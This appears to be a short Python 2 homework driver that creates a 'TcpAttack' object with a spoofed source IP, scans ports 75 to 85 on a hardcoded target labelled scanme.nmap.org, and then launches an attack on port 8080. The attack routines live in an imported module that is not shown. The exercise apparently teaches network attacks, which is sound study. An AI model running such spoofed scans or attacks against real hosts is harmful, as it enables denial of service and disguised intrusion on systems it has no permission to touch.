from abeysiriwardane_hw08 import *

spoof_ip = '173.194.46.51'
target_ip = '67.215.65.132' #scanme.nmap.org
rangeStart = 75
rangeEnd = 85
port = 8080

tcp = TcpAttack(spoof_ip, target_ip)
tcp.scanTarget(rangeStart, rangeEnd)

print "Attack target"
raw_input()

if tcp.attackTarget(port):
    print 'Port was open to attack'
